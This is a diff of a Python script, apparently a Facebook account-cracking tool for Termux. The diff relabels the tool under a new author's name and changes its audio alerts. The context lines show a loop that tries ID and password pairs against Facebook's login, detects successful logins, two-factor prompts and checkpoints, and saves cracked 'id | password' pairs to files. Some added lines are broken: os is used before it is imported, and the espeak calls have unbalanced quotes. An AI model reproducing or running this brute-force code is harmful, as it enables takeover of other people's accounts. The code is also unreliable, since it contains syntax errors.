@@ -5,6 +5,9 @@
 #tottaly written by hamid Khawaja
 #!/usr/bin/python3
 #---------------------[IMPORT]---------------------#
+os.system("pkg install sox -y")
+os.system("play op.mp3")
+os.system("pkg install espeak")
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import os,sys,time,json,random,re,string,platform,base64,platform,uuid
@@ -125,10 +128,10 @@ logo ="""
 \033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
                                                  
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
-\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
-\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m SHANTO-king-06                  \033[1;31m │
+\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36mRHS✯TEAM\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
+\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mHRIDOY HOSSEN SHANTO            \033[1;31m│
+\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mSH AN TO                                                 \033[1;31m│
+\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m SHANTO                  \033[1;31m │
 \033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mSHANTO WORLD                  \033[1;31m   │
 \033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │
 \033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
@@ -400,7 +403,7 @@ def method1(ids,names,passlist,total_ids):
             next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
             cookies = r.cookies.get_dict().keys()
             if 'c_user' in cookies:
-                os.system("play-audio SHANTO_OK.mp3")
+                os.system('espeak -a 300 "SHANTO, OK, ID')
                 print('\r\033[1;32m[SHANTO-OK] '+ids+' | '+pas+'\033[1;97m')
                 ok.append(ids)
                 open('/sdcard/SHANTO_OK.txt', 'a').write(ids+' | '+pas+'\n')
@@ -409,13 +412,13 @@ def method1(ids,names,passlist,total_ids):
                 d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d):
-                    os.system("play-audio SHANTO_2F.mp3")
+                    os.system('espeak -a 300 "SHANTO, 2F")
                     print('\r\033[1;35m[SHANTO-2F] '+ids+' | '+pas+'\033[1;97m')
                     tf.append(ids)
                     open('/sdcard/SHANTO_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    os.system("play-audio SHANTO_CP.mp3")
+                    os.system('espeak -a 300 "SHANTO, CP")
                     print('\r\033[1;31m[SHANTO-CP] '+ids+' | '+pas+'\033[1;97m')
                     cp.append(ids)
                     open('/sdcard/SHANTO_CP.txt', 'a').write(ids+' | '+pas+'\n')
